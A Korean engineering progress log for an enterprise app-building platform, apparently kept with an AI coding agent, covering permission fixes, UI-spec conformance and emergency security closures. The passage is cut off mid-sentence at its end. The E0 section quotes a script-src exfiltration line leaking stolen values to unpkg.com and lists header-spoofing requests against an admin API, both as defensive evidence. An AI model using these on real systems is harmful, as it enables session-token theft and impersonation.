# 전체 진척도

> 이 파일이 **진척의 단일 정본**이다. 보고할 때 숫자를 추정하지 않고 여기서 센다.
> 갱신: **2026-08-09(트랙 J 신설 — UIUX 확정안 §5~§11 전 절 대조 완료)** · 근거:
> `docs/uiux/LIVING_ENTERPRISE_UI_DESIGN_SPEC_2026-07-30.md` · `docs/uiux/CHECKLIST_AUDIT_2026-08-09.md` ·
> `docs/design_agent_governance_scope_permissions_2026-08-04.md` §9 ·
> `.agents/DECISIONS.md` `[D-018]` 이행 규칙 10단계 · `.agents/TEAM_BOARD.md` 이관 순서 ·
> 코드 실측(`HubDialog` 사용 화면 수 · 라우트별 `current_principal` 유무)
>
> ⚠️ **확인하지 못한 것을 완료로 세지 않는다.** 카나리의 `SKIP` 을 통과로 세지 않는 것과 같은
> 규칙이다. 다른 세션의 «완료» 주장도 코드에서 확인되기 전에는 반영하지 않는다.
>
> ⚠️⚠️⚠️ **2026-08-08 에 145/145(100%) 가 됐다 — 그러나 이것은 «완성» 이 아니다.**
> 같은 날 **결함 12건**이 나왔고 그중 여럿은 «이미 완료로 세어 둔» 항목 안에 있었다:
> 화면이 백엔드에 붙어도 늘 빈 목록이었고(봉투 불일치), 「우리 조직」 탭은 영원히 비어 있었으며
> (`ORG` vs `SCOPE`), 정책이 켠 강제를 한 줄이 무시했고, 만료일은 판정과 표시가 갈라져 있었다.
> **전부 «완료» 표시 뒤에서 조용히 틀려 있던 것들이다.** 100% 는 「계획한 일을 다 했다」이지
> 「제품이 옳게 동작한다」가 아니다 — 후자는 실측으로만 알 수 있고, 오늘 그것을 12번 배웠다.
>
> ⚠️⚠️ **이 합계는 «계획된 일» 의 진척이며 «시스템 완성» 이 아니다.** 아래 §세지 않는 것에
> 트랙으로 잡히지 않은 덩어리가 있고, 그중 무방비 라우트는 2026-08-05 분류를 마쳐 **트랙 G** 로 들어왔다.
> ★ **부분 트랙의 진척을 전체처럼 보고하지 말 것** — 예: «D-018 10/10» 은 80항목 중 10항목의
> 진척이다. 그것을 맨 위에 큰 막대로 놓으면 «거의 끝났다» 로 읽힌다(2026-08-05 실제 지적받음).
>
> ⚠️ **분모가 78 → 80 으로 늘었다**(2026-08-05 병합 후). 트랙 G 를 파일 단위로 세는데, 병합
> 결과를 실측하니 무방비가 남은 파일이 14개가 아니라 **16개**였다. 병합 전 예측표가 `factory`
> 를 브랜치 값(2)으로 잡았지만 충돌을 dev 쪽으로 해결해 11이 남았고, 그것을 다시 2로 고치는
> 과정에서 파일 구성이 달라졌다 — **예측이 아니라 실측으로 센다.**

## 한눈에

| 트랙 | 진척 | 상태 |
|---|---|---|
| A. 폐루프 CL-0~5 | `██████████` 6/6 | 완료(카나리 35/35) |
| B. 권한 봉합 D-017 §9 | `██████████` 23/23 | **P0~P4 전부 완료**(2026-08-08) · P4-4 는 중복만 |
| C. 화면 이관 10단계 | `██████████` 10/10 | **병합 완료**(2026-08-05 · 시각 승인은 별건) |
| D. ECM 정본 이행 D-018 | `██████████` 10/10 | **완료**(2026-08-05) |
| E. **SW Factory Studio 재구축** | `█████████░` 6.5/7 | **전환 게이트 0/0/0 통과**(2026-08-07) · 승격은 사용자 승인 |
| F. 화면 이관 추가 8화면 | `██████████` 8/8 | **완료**(2026-08-07) · 7개에서 «조용한 거짓말» 발견 |
| G. **잔여 라우트 봉합** | `██████████` 16/16 | **완료**(2026-08-07) · 게이트 126검사 |
| H. **식별만으로 열리는 쓰기** | `██████████` 65/65 | **완료**(2026-08-08) · 발간 7 + 의사결정 8 + 샌드박스 봉합 |
| I. **생성 앱 데이터 평면** | `███░░░░░░░` 2.5/7 | **신설**(2026-08-08) · I-1·I-2 완료 · 아래 상세 |
| J. **UIUX 확정안 정합** | `██████████` 6/6 | ⚠️ **관문 밖 작업**(아래 경고) · 로그인 + §5·§6·§7·§9·§11 |
| **E0. 긴급 봉합** | `██████████` 4/4 | **완료**(2026-08-09) · 아래 상세 |
| **합계** | `█████████░` **158/162 (98%)** | ⚠️ 분모 158 → **162**(E0 신설) |

### ★★★ E0 — Emergency Gate (실측으로 확인된 열린 문)

> 근거: `docs/roadmap/..._EXECUTION_PLAN_2026-08-03.md` §2.4 · 승인 2026-08-09
> ⚠️ 이것은 **기능 진척이 아니라 사고 대응**이다. 다른 트랙보다 먼저 닫는다.

| ID | 결함 | 상태 |
|---|---|---|
| E0-0 | HEAD 가 미추적 모듈 import — **깨끗한 checkout 에서 백엔드 미기동** | ✅ `290688ba5` |
| E0-1A | Preview iframe 이 **부모 세션 토큰 노출** + 생성 코드가 **LLM 자동 호출** | ✅ 2026-08-09 |
| E0-1B | `?as_user=` 로 **남의 실시간 알림 구독** 가능 | ✅ `730ce8738` |
| E0-1C | `ORG_TRUST_HEADER=True` — **헤더 한 줄로 관리자 API 조회** | ✅ 2026-08-09 |

**E0-1C 실측 대조**(같은 코드, 스위치만 다른 두 서버를 나란히 눌렀다)

| 요청 | 구 설정(8080) | 새 설정(8081) |
|---|---|---|
| `-H 'X-Factory-User: …'` → `/admin/scope-policy` | **200** | **401** |
| `-H 'X-User-Id: …'` (구 헤더) | **200** | **401** |
| `?as_user=…` | **200** | **401** |
| `-H 'X-Session-Token: …'` (로그인) | 200 | **200** ← 정문은 살아 있다 |
| 세션 + 남의 헤더 동시 | — | **세션 사용자로 응답**(사칭 실패) |
| 세션으로 SSE 티켓 발급 | — | **200** |

**E0-1A 마무리 — CDN 로컬화**(2026-08-09)

`connect-src 'none'` 으로 fetch·XHR·WebSocket 을 다 막아 놓고도 `script-src` 에
`cdn.tailwindcss.com` · `unpkg.com` 이 열려 있었다. 그 한 줄이면 우회된다 —
`s.src = 'https://unpkg.com/x?leak=' + 훔친값`. 벤더 5종을 로컬 패키지에서 만들어
**srcDoc 안에 직접 적어 넣고** CSP 에서 호스트를 전부 지웠다.

| 확인 | CSP 켠 채 | CSP 뺀 대조군 |
|---|---|---|
| 외부 `<script src>` (unpkg) | **차단됨** | 로드됨 |
| JSX 컴파일·렌더 | 정상 | 정상 |
| lucide 아이콘 SVG | 그려짐 | 그려짐 |
| Tailwind `font-bold` | 적용됨 | 적용됨 |

실앱 실측 — srcDoc 4.16MB, `<script src=>` **0개**, CSP 에 호스트 **0개**, 벤더는
우리 출처(`/preview-vendor/*`)에서만 200, `IFRAME_READY` 수신.

**화면 증거**(`docs/uiux/screenshots/e0_1a_*.png`). ⚠️ 이 디렉터리는 `.gitignore` 대상이라
저장소에 없다 — **이미지 대신 만드는 방법을 남긴다.**
`venv/Scripts/python.exe scripts/capture_e0_1a_evidence.py`
(프론트 5175 · 백엔드 8080 이 떠 있어야 한다)

| 파일 | 무엇을 보여 주는가 |
|---|---|
| `e0_1a_preview_sandbox_iframe.png` | 생성 앱(단위 변환기)이 **CDN 없이 그대로 렌더**된다 |
| `e0_1a_preview_sandbox_1440x900.png` | Studio 안에서 본 같은 화면 |
| `e0_1a_probe_csp_on.png` | 제품과 같은 CSP — 외부 `<script src>` **차단됨** |
| `e0_1a_probe_csp_off.png` | **대조군**(CSP 만 뺌) — 같은 요청이 **로드됨** |

⚠️ 대조군이 없으면 「차단됨」은 아무것도 증명하지 않는다 — 네트워크가 없어도 같은 답이
  나온다. 그래서 두 장을 **쌍으로** 남긴다.

⚠️ 첫 캡처는 `demo-todo-app` 을 열어 「컴포넌트 렌더링 대기 중」만 찍혔다. 그 프로젝트에는
  `frontend_code_summary` 가 **없다** — 미리보기가 깨진 것이 아니라 그릴 코드가 없었다.
  증거를 고를 때 «비어 있는 대상» 을 쓰면 멀쩡한 것을 고장으로 보고하게 된다.

★ 부모 문서에 주입되던 `cdn.jsdelivr.net` mermaid 도 함께 지웠다 — iframe 안보다 이쪽이
  더 위험하다. 부모에는 세션 토큰이 있고 주입된 코드가 그 전부에 닿는다.

⚠️ **E0 가 닫혀도 «보안 완료» 가 아니다.** 신원은 닫혔지만 **조직·프로젝트 단위 이벤트
  격리(G1-C)** 는 그대로 열려 있다 — 같은 회사의 다른 조직 이벤트가 아직 걸러지지 않는다.


> ⚠️⚠️⚠️ **2026-08-08 트랙 I 신설로 분모가 145 → 152 가 됐다. 직전에 이 표는 «145/145 ·
> 100%» 였다.** 그 100% 는 «계획해서 트랙에 올린 일» 의 100% 이지 **시스템이 쓸 수 있다는
> 뜻이 아니었다.** 사용자가 그 간극을 지적했다(2026-08-08):
>
> > **«저장도 되지 않는 프로그램을 관통 테스트하는 게 무슨 의미가 있는가»**
>
> 실측으로 확인한 것 — **생성된 앱은 데이터를 저장할 수 없었다.** 프론트는 iframe 에서 돌지만
> 백엔드는 import 부팅 검사 후 버려지고(`tools/backend_smoke_run.py`), 앱의 DB 는 만들어진 적이
> 없으며, 샌드박스 토큰은 «읽기 전용» 이다. 즉 만들 수 있는 앱은 «저장이 안 되는 프론트엔드»
> 였고, `docs/business_value_assessment.md` §6-A 가 대표 예시로 든 **구매 요청 관리·설비 점검
> 체크리스트·원료 입고 대장은 셋 다 저장이 필요해 하나도 만들 수 없었다.**
>
> ★ **이 덩어리는 어느 트랙에도 없었다.** 각 조각을 완성하고 이어 붙이는 방식으로 작업했기
> 때문에, **어느 조각에도 속하지 않는 것**은 분모에 들어간 적이 없다. 그래서 조각의 합은
> 100% 인데 관통은 성립하지 않았다. 트랙 E·F·G 가 늘어난 것과 같은 유형이며, 이번이 네 번째다.
> → **교훈: «완료» 를 세기 전에 «이것으로 사용자가 무엇을 할 수 있는가» 를 먼저 묻는다.**

> ⚠️⚠️ **2026-08-08 트랙 H 재실측으로 분모가 121 → 145 로 늘었다.** 진척률이 95% → 84% 로
> «떨어진» 것이 아니라, **세지 않고 있던 것을 세기 시작한 것**이다(2026-08-05 와 같은 유형).
> 종전 H 는 권한 배정표가 다루는 **7개 라우터만** 보고 「남은 4건」이라 적었는데, 전체 라우터를
> 같은 방식으로 훑으니 식별만으로 열리는 쓰기가 **28건** 남아 있었다.
> ★ 그중 발간 계열 7건에서 **남의 대외 발간물을 내보낼 수 있는** 구멍이 나왔다(아래 H).
>
> ⚠️ **2026-08-05 전체 점검으로 분모가 49 → 78 로 늘었다.** 진척률이 57% → 37% 로 «떨어진» 것이
> 아니라, **세지 않고 있던 일을 세기 시작한 것**이다. 늘어난 트랙 셋:
> · **E** — SW Factory Studio 는 Concept E 채택으로 «이관» 이 아니라 **재구축**이 됐다(성격이
>   달라 C 에서 분리했다). 담당은 **Claude Code** 이고 `[UX-SW-FACTORY-ADAPTIVE-37]` 이
>   «선택사항 아님» 으로 지시했다 — 그런데 어느 트랙에도 없었다.
> · **F** — 추가 8화면은 사용자가 승인했으나 10단계 트랙에 자리가 없었다.
> · **G** — 무방비 라우트 94개를 익명 호출로 분류했다. **차단은 0개였다** — 「분류하면 대부분
>   의도적 공개일 것」이라는 예상이 틀렸다. 병합으로 41개가 해결돼 **53 라우트 / 16 파일**이
>   남았고, 파일 단위 16개를 분모로 센다.

> ★ **C 의 «두 숫자» 는 해소됐다**(2026-08-05). `claude/nice-hawking-f8b4bf` 의 커밋 7개를
> `dev` 에 병합했고, 그래서 정본 숫자가 2/10 → 10/10 이 됐다. 예상대로 충돌이 났고(4건),
> **예상하지 못한 쪽에서 회귀 5건**이 나왔다 — 상세는 아래 «병합(C)이 해결한 몫».

> ★ **원래 계획의 Wave 1~6 과 실제 진행 순서가 다르다**(`.agents/TEAM_BOARD.md:503`).
> 계획은 `Gate 0 → Wave 1 데이터기반 → Wave 2 안전연계 → Wave 3 AI통제 → **Wave 4 핵심생성
> (SW Factory)** → Wave 5 경영·Twin → Wave 6 보조` 였으나, 사용자 지시로 순서가 조정됐다
> (4/10 조직·권한 → 5/10 거버넌스 → 6/10 에이전트 → 7/10 프로젝트 → 런처).
> **Wave 4 = 트랙 E** 이며 아직 시작하지 않았다.

---

## ★★★ UIUX 확정안 적용 + 로그인 (2026-08-09) — 사용자 지적에서 시작

사용자가 서버를 띄워 확인하고 세 가지를 지적했다. **전부 사실이었다.**

### ① 백엔드가 연결되지 않았다 — 내 잘못

`frontend/.env.local` 이 `127.0.0.1:8081`(다른 세션 검증용)을 가리켜 8080 에 띄운 서버를 못
봤다. 나는 그날 그 파일을 **읽었고** 「8081 은 다른 세션」이라고 인지했으면서 내 것만 지우고
이건 뒀다. → 두 파일 모두 제거. 이제 `.env` 의 8080 을 본다.

### ② 앱에 **문이 없었다** — 로그인 신설

`actingUser` 기본값이 `'admin'` 이라 열면 관리자였고, 최상단 계정 전환기로 아무 계정이나 골라
그 권한으로 볼 수 있었다(`api/deps.py` 가 「②③ 은 인증이 아니다」라고 못박아 둔 임시 장치가
제품 화면에 남아 있었다).

· `core/auth.py`(pbkdf2 해시·세션) + `api/routes/auth_control.py`(login/logout/me/password)
· 세션을 **`deps` 의 SSO 슬롯**에 물려 **기존 라우트를 하나도 고치지 않았다** — 설계가 처음부터
  비워 둔 자리다. 서버는 **헤더보다 토큰을 먼저** 본다.
· 신규 가입 없음(지시) · 실패 사유를 「아이디 없음/비밀번호 틀림」으로 **나누지 않는다**
· 권한을 토큰에 담지 않는다 — 담으면 회수해도 토큰이 사는 동안 유효하다
· 초기 비밀번호 전 계정 공통(지시) → **`must_change_password` 로 바꾸라고 말한다**
· `UserSwitcher` 제거, `SessionBar`(확인 전용)로 교체

### ③ 첫 화면이 설계와 **반대**였다

설계 §3.2/§3.4 는 「Decision Canvas(경영 홈) → Immersive Studio」인데 실제는 「신규 프로젝트
개설」 폼이 첫 화면이었다(2026-07-28 AS-IS 그대로. 화면 이관은 개별 화면만 옮겼다).
⚠️ **전 화면 감사를 하고도 못 봤다** — 화면 «안» 의 버튼·권한은 봤지만 「이 화면이 여기 있는
게 맞나」를 묻지 않았다. 감사의 축이 빠져 있었다.

### 그 다음 지적: 「큰 모양은 맞는데 세부 구성이 틀려」 — 재대조

첫 구현은 §3.1 골격만 맞았다. 설계서를 다시 읽고 대조하니:

· **§1.2 «고정할 요소» 7가지 중 3개가 없었다** — ② Digital Thread · ③ DATA/SW/TWIN 레이어 ·
  ⑥ 상단 회사 Context. 전부 추가했다.
· **§1.3 최소 크기를 어겼다** — 설계는 「프로토타입의 8~11px 를 실제 제품에서는」 본문 14px+ ·
  라벨 12px+ · 버튼 36px+ · KPI 22px+ 로 올리라고 못박는데 11~13px 를 본문에 남발했다.
· **§2.4 간격** — 화면 24~32 / 카드 16~20 / gap 16 / 카드 r8 규격을 10~14px, r10 으로 썼다.
· **존재하지 않는 CSS 변수를 참조했다** — `var(--afs-border)` 는 이 저장소에 없는 이름이다
  (정본 `--surface-border`). 토큰은 같은 승인 시안에서 나왔고 색값도 설계와 일치하는데
  (`--ls-navy #0a1e5a` = `--brand-primary`) 내가 쓰지 않았다.
· **§3.1 Top Bar 72px** 인데 64px 이었다.
· **§5.3 상단 Context Bar** 인데 하단에 뒀다 — 문맥은 **누르기 전에** 읽어야 한다.

### 적용한 화면 (§5)

| 설계 | 결과 |
|---|---|
| §5.1 `/enterprise` 경영 홈 | 확정 7요소 · 3열 280/785/360 · Top Bar 72 |
| §5.1 Decision Drawer | **520px** · Summary→Impact→Evidence→Related→Approval→History · sticky footer |
| §5.2 `/build` 목록면 | 새 업무 만들기 + 필터 5종 · 카드 320px · 주 CTA 「열기」 |
| §5.2 `/build/start` | 옵션 56px+(실측 64) · 「지금 정해진 것·다음 전환」 |
| §5.3 공통 Hub | `HubShell` 이 이미 238/최소680/300 규격 · 상단 Context Bar 로 이동 |

### ⚠️ 지어내지 않은 것 (화면에 그대로 적었다)

· §4.2 «담당 역할·기한» — 서버가 주지 않는다 → **«미지정»**
· §4.3 «process profile» — 서버에 없다(`/master/domains` 404) → 조직 트리를 쓰되
  **「공정 단위 흐름이 아니다」**를 적는다
· Decision Drawer 의 정량 영향·처리 이력 — **「숫자를 지어내지 않았습니다」**
· `/build` 「진행 중」의 정의 — 서버가 진행 상태를 안 줘서 «완료되지 않은 것» 으로 보고
  그 기준을 화면에 적는다

### 실측 (실 데이터)

로그인 → 경영 홈 → 안건 상세 → Studio → 새 업무 만들기 왕복 정상.
큐 16건(결정 5 + 막힘 11) · KPI 5/11/2/$5.69 · Trust 4카드(MDM 21종 · 지식 4팩 ·
**외부지표 6개 중 사용 가능 0개, 6개 기준선 차단**) · Build 5버킷(59/60/1/3/2)

### ★ 그 뒤 — 설계서 §5~§11 **전 절 대조 완료** (트랙 J · 6/6)

| 단위 | 결과 |
|---|---|
| 로그인·세션 인증 | `core/auth.py` · `/api/v1/auth/*` · 계정 전환기 제거 |
| §5 화면 사양 8절 | 5.1~5.8 전부. 관리자 콘솔·의미 그래프 탭 **신설** |
| §6 상호작용 5항 | ★ **늦게 온 응답이 다른 선택 위에 그려지던 것**(8곳) · 확인 Sheet 5요소 |
| §7 Atlas 계약 3항 | 답변 6단 구조 · 경계 테스트 5건 |
| §9 접근성·반응형·성능 | ★ **대비 미달 56→0** · 6개 폭 가로 스크롤 0 |
| §11 검수 체크리스트 | **충족 34 / 미충족 3** → `docs/uiux/CHECKLIST_AUDIT_2026-08-09.md` |

인수인계: `docs/chronicle/handoffs/handoff_2026-08-09_uiux_spec_conformance.md`

⚠️ **미충족 3건은 전부 서버 기능이 먼저 필요하다** — 공정 프로필 원천 없음 · Atlas 실행 경로
없음 · Connector→Contract→Crosswalk→MCP 순서 안내 없음. **화면에 그 사실을 적어 두었다.**

⚠️⚠️ **이 트랙의 6/6 은 «설계와 대조해 고쳤다» 이지 «기능이 옳게 돈다» 가 아니다.** 이 세션에서
  `tsc` 통과 뒤에도 화면이 죽거나 빌드가 깨진 사고가 셋, **검증 명령이 빌드 실패를 삼킨 것**이
  한 번 있었다.

⚠️⚠️⚠️ **더 큰 문제 — 이 트랙의 상당 부분은 로드맵이 지정한 작업이 아니었다.**

작업자(Claude Code)가 `AI_FACTORY_STUDIO_PRODUCT_BIBLE.md` · 전략(2026-08-03) ·
로드맵(2026-08-03)을 **한 건도 읽지 않고** UI 설계 확정안만 정본으로 삼아 진행했다.
로드맵 §15 「권고 착수 14개」와 대조한 결과:

| 상태 | 항목 |
|---|---|
| 완주 3 | 8 CL-1 전달·수락 · 10 AppShell UI 계약(이 트랙) · 13 CL-2/3 결정·발간 |
| 부분 4 | 1 CL-0.5 · 6 CERTIFIED/대사 · 9 Query Contract · 12 Replay |
| **0** | **2 사용자별 SSE · 3 Host Runtime 단기 토큰 · 5 MVA Source Inventory ·
7 의미 모델 런타임 · 11 결정론적 계산 그래프 · 14 Shadow Pilot** |

그리고 §9 접근성 대비 56건·§11 검수 체크리스트는 **권고 14개에 없는 작업**이다. 나쁜 작업은
아니지만 **지금 할 일은 아니었다.** 로드맵 §15 마지막 줄이 「사용자별 SSE 와 Host Runtime 최소
계약 없이 제품 통합을 완료해서는 안 된다」고 못박았는데, CL-1~5 는 완주하고 그 둘은 0 이다.

★ 재발 방지로 `.agents/AGENTS.md` 최상단에 **「작업 착수 전 필독 순서」** 를 신설했다.
  다음 작업은 **권고 착수 14개 중 0 으로 남은 여섯 개**부터 잡아야 한다.

사용자 기능 테스트가 다음 순서다.

---

## A. 폐루프 CL-0~5 — 6/6 완료

| # | 항목 | 상태 |
|---|---|---|
| CL-0 | App-in-App Manifest | ✅ |
| CL-1 | 앱 전달·수락·내 앱 | ✅ |
| CL-2 | Decision Package | ✅ |
| CL-3 | 대내외 발간 | ✅ |
| CL-4 | 사용자별 알림 격리 | ✅ |
| CL-5 | 폐루프 카나리 | ✅ 35/35 |

## B. 권한 봉합 D-017 §9 — 21.5/23

| 단계 | 항목 | 진척 |
|---|---|---|
| **P0** 즉시 보안 봉합 | 6개 | `██████` **6/6 ✅** |
| **P1** 범위형 자산 저장소 | 5개 | `█████` **5/5 ✅** |
| P2 생성기 UI 통합 | 4개 | `████` **4/4 ✅** — 아래 상세 |
| P3 런타임 강제 | 4개 | `████` **4/4 ✅** — 아래 상세 |
| P4 품질·비용·운영 | 4개 | `████` **4/4 ✅** — P4-4 나머지 절반(관측 신설) 완료 |

### P4 상세 (2026-08-07 · 4/4 완료)

| # | 항목 | 상태 |
|---|---|---|
| 1 | 에이전트별 비용·성공률 집계 | ✅ (한도·모델 정책은 ⬜ — 아래) |
| 2 | 조직별 사용량·실패·승인 대기·정책 위반 대시보드 | ✅ (집계) |
| 3 | 검증된 조직 자산의 전사 승격 추천 | ✅ |
| 4 | 미사용·중복 에이전트·스킬 정리 제안 | ◐ **중복만** — 미사용은 근거 없음(아래) |

**P4-1 — 대시보드가 조용히 거짓말하는 것을 먼저 막았다.**

실측: `llm_call_log.jsonl` **1,133건 중 실행 주체가 기록된 것은 89건(8%)** 이다. 계측 축이
나중에 추가됐기 때문이고 그 자체는 정상이다. 그런데 이 상태에서 「에이전트별 비용」을 순진하게
집계하면 **총비용의 8%만 보인다.** 화면에는 그럴듯한 막대가 서고 아무도 「나머지는 어디 갔나」를
묻지 않는다 — **숫자가 있으면 사람은 그것을 전부라고 읽는다.**

그래서 셋을 지킨다:
1. 귀속되지 않은 호출을 **버리지 않고** «(미상)» 으로 같은 표에 세운다
2. **관측률**을 숫자와 **문장**으로 함께 낸다(숫자만 두면 아무도 안 본다)
3. 단가를 모르는 호출은 비용에 **더하지 않는다** — 0 은 「공짜였다」는 거짓이다

살아 있는 서버 실측(`GET /api/v1/telemetry/agents`):

```
관측률 8% (89/1133) · 미가격 49건
비용 상위:  (미상) $4.77 (1044콜)  ←  가장 큰 항목이 «모름» 이다
            Master_PM $0.43 · Master_PMO $0.22 · Tech_Lead $0.10
```

★ 이름 있는 1위(Master_PM $0.43)만 보여 줬다면 **실제 지출의 92%가 화면에서 사라졌을 것이다.**

### ★★ 이 기능이 곧바로 드러낸 운영 결함

```
Master_PMO              성공률 6.7%  (표본 30콜)
Requirement_Interviewer 성공률 33%   (표본 6콜)
```

⚠️ **`Master_PMO` 는 30콜 중 2콜만 성공한다.** 표본이 충분하므로 우연이 아니다. 이것은 P4 의
집계가 없어서 아무도 못 보던 상태였다 — 별건으로 원인을 봐야 한다.
★ 성공률 목록은 표본 5콜 미만을 뺀다. 1콜 실패를 «성공률 0%» 로 올리면 목록이 소음이 되고,
소음이 되면 사람이 목록 자체를 보지 않는다.

⬜ **P4-1 의 「비용 한도·모델 정책」은 하지 않았다.** 정책 저장소가 **없다**(실측 —
`MODEL_POLICY_MANAGE` capability 는 있는데 그것이 통제할 대상이 없다). 한도를 만들려면
저장·강제·초과 시 행동까지 필요하고, 그것을 세션 끝에 급히 얹으면 «한도가 있는데 안 걸리는»
상태가 된다. **관측을 먼저 세우고 한도는 다음에 얹는다.**

### P4-3 · P4-4 — 구현 완료 (설계 §6 결정 반영: 안 B · 안 A)

**P4-3 전사 승격 추천** — `core/promotion_advisor.py` ·
`GET /api/v1/workspace/promotions/recommendations`

★★ **판정을 다시 하지 않는다.** `evaluate_gate` 의 `promotable` 을 **그대로** 쓴다. 다시 세면
화면과 실제 게이트가 다른 말을 하고, 「승격 준비됨」이라던 것이 신청하면 막힌다 — 그때
사용자는 추천을 신뢰하지 않게 되고 이 기능은 있으나 마나가 된다.
★ 해소 방법(`suggested_action`)도 게이트가 준 것을 그대로 쓴다.

**살아 있는 서버 실측**(관리자 200 / viewer 403):
```
추천 0건 · 가까운 것 3건 · 판정 3건 · 못 읽음 0
  각 릴리스: fail=1, unverifiable=4
  「이 릴리스가 어떤 데이터 자산을 쓰는지 등록돼 있지 않습니다」
```
★ `unverifiable` 을 통과로 셌다면 **3건 전부 추천됐을 것이고, 신청하면 전부 막혔을 것이다.**

**P4-4 자산 위생 — 중복(오전)** — `core/asset_dedup.py` · `GET /api/v1/telemetry/asset-hygiene`

동일(확신 높음)과 유사(확신 낮음)를 **분리**한다(결정 ① 안 B). 확신의 차이를 화면에서 지우면
사람은 목록 전체를 같은 무게로 읽고, 한 번 잘못 지우면 다시는 이 목록을 쓰지 않는다.
LLM 0콜(§6.1). 제안은 «지워라» 가 아니라 **«둘 중 어느 쪽이 정본인지 고르라»** 다.
⚠️ 자동 삭제 경로를 만들지 않았다 — 스킬을 지우면 그것을 이름으로 참조하던 에이전트가
**기본 스킬로 조용히 강등**되고, 그 강등은 오류를 내지 않는다.

**살아 있는 서버 실측**: 비교 33건 · **동일 묶음 1건 발견**(`as_839aed705a20` ↔
`as_4cfc60e50e98`) · 유사 0 · 원천 오류 없음.

⬜ **「미사용」은 만들지 않았다**(결정 ② 안 A). 자산에 사용 이력 필드가 **없고** 실행 로그의
에이전트 귀속률이 **8%** 다. 「호출 0건 = 미사용」이라고 제안하면 *관측되지 않았을 뿐인*
자산을 지우라고 말하게 되고, 받은 사람은 확인할 방법이 없다. → 빈 목록 대신 사유를 문장으로
낸다(`unused.available=False`). **빈 목록은 「정리할 것이 없다」로 읽힌다.**
★ 그래서 P4-4 는 **0.5** 로 센다 — 절반을 완료로 세지 않는다.

---

### P4-4 나머지 절반 — 관측을 만들어서 채웠다 (2026-08-07 오후 · **4/4**)

**`core/asset_usage.py`(신설)** — 자산이 **실제로 해석되는 두 지점**에서 직접 기록한다.

| 기록 지점 | 대상 |
|---|---|
| `agent_registry.agent_skill()` | 파일 스킬(31개) — 스킬이 **선택되는** 유일한 곳 |
| `agent_asset_adapter.resolve_workflow()` | DB 워크플로우 자산 · 파일 템플릿 |

★ **설계가 든 선행 2가지 중 ②(귀속률 8%)는 이 목적에 필요 없었다.** ②는 LLM 호출 로그를 통한
**간접 추정**이고, ①은 자산이 해석된 순간의 **직접 관측**이다. 간접이 좋아지기를 기다리느라
직접을 미룰 이유가 없다.

⚠️ 승인 가드에서 막힌 자산은 **세지 않는다** — 실행되지 않았기 때문이다. 거기서 세면
「승인 안 된 자산이 잘 쓰이고 있다」는 모순된 화면이 나온다.

**⚠️⚠️ 관측은 켠 시점부터 쌓인다 — P4-2 의 귀속률 0% 와 같은 함정**

관측 다음 날이면 자산 전부가 「사용 기록 없음」이다. 그 화면을 본 사람은 전부 지우고, 지운
뒤에야 그것이 「안 쓰인 것」이 아니라 **「아직 안 본 것」**이었음을 안다. 그래서
`find_unused` 는 관측 기간이 `MIN_OBSERVATION_DAYS`(14일)에 못 미치면 **목록을 만들지 않고**
`available=False` 와 «약 N일 뒤에 제공됩니다» 를 낸다. 빈 목록도 아니다.

⚠️ 이름을 「미사용」이 아니라 **「관측 이후 사용 기록 없음」** 으로 쓴다. 서버가 아는 것은
자산이 해석되는 것을 본 적이 없다는 것뿐이다. 「본 적 없음」(`never_observed`)과
「오래 전에 봤음」(`stale`)도 구분해 낸다 — 후자만 근거가 있는 판단이다.

**살아 있는 서버 실측**: 익명 403 / 관리자 200 · 비교 33건 · `unused.available=False` ·
`window={observed_since, days_observed:0.0, min_observation_days:14, stale_after_days:30}`.

### ★★★ 단위 테스트가 초록인데 **관측이 통째로 헛돌고 있었다**

`agent_skill()` 은 `rfp_skill` 을 돌려주는데 `collect_items()` 는 파일명 `rfp_skill.md` 를
id 로 쓴다. 두 키가 달라 **교집합이 0건**이었다 — 매 실행마다 쓰이는 스킬 31개가 전부
「사용 기록 없음」으로 보고될 참이었다. 즉 **관측을 켜 놓고도 화면은 「전부 정리 대상」**.

⚠️ 그 검사는 **통과하고 있었다.** `agent_meta` 를 `"writer.md"` 로 대역해 뒀더니 테스트가
**자기 자신과 합의**했다. 잡은 것은 서버 실측이다(같은 함정 6번째).
→ 변환을 `asset_usage.skill_key()` 한 곳으로 모으고, 그 검사를 **대역 없이 실제 레지스트리·
실제 `skills/`** 로 다시 썼다. 변이 검사로 실제 잡는 것을 확인했다(규약을 되돌리면 3건 실패).

⚠️ `conftest` 에 관측 격리를 추가했다 — 없으면 `agent_skill()` 을 부르는 **스위트 전반이
운영 관측 기록을 만든다**(그러면 「이 자산이 쓰이는가」의 답이 테스트 때문에 바뀐다).

### ★★ 이 작업에서 드러난 검사 방식의 한계

`asset-hygiene` 이 살아 있는 서버에서 **500** 이었다 — `telemetry_control` 에 `asyncio`
import 가 없었다. 그런데 **소스 문자열 검사(«이 함수에 이 문자열이 있는가»)는 전부 초록**이었다.

⚠️ **소스 검사는 «배선» 을 확인하지만 «실행» 을 확인하지 못한다.** 그래서 두 라우트를 실제로
호출하는 테스트를 더했다 — 200 이 아니어도 좋고 **500 이 아니면 된다**(403 은 통제가 작동한
것이고, 500 은 코드가 깨진 것이다).

### (착수 전 설계 판단 — 기록 보존)

`docs/design_p4_recommendations_2026-08-07.md`

P4-1·P4-2 는 **집계**였다. 집계는 틀려도 「숫자가 이상하다」로 드러난다. P4-3·P4-4 는
**추천**이고, 사람이 그것을 근거로 **되돌리기 어려운 행동**을 한다 — 전사 승격은 회수해도
이미 본 사람이 있고, 자산 정리는 지운 뒤에 필요했다는 것을 안다.
★ **틀린 추천은 침묵보다 나쁘다.** 추천이 없으면 사람이 직접 판단하지만, 틀린 추천이 있으면
판단을 그것에 위임한다.

**착수 전에 원천을 실측했다**(추측하지 않았다):

| 원천 | 상태 | 추천에 쓸 수 있는가 |
|---|---|---|
| 승격 게이트 4검사 | `pass`/`fail`/**`unverifiable`** | ✅ |
| 자산 사용 이력 | **필드 자체가 없다** | ❌ |
| 텔레메트리 에이전트 축 | 관측률 **8%** | ❌ |

★★ **「미사용」을 판단할 근거가 없다.** 「호출 0건 = 미사용」이라고 추천하면 *관측되지 않았을
뿐인* 자산을 지우라고 말하게 되고, 받은 사람은 확인할 방법이 없다(화면이 「0건」이라고 하니까).
→ **미사용 항목은 만들지 않고**, 빈 목록 대신 「사용 이력이 없어 제공하지 않습니다」를 쓴다.
빈 목록은 「정리할 것이 없다」로 읽힌다.

★★ P4-3 의 핵심은 **`unverifiable` 을 통과로 세지 않는 것**이다. 게이트에서 가장 흔한 상태가
`unverifiable`(「사용 자산을 모르므로 검사할 수 없다」)이므로, 그것을 완화하면 거의 전부가
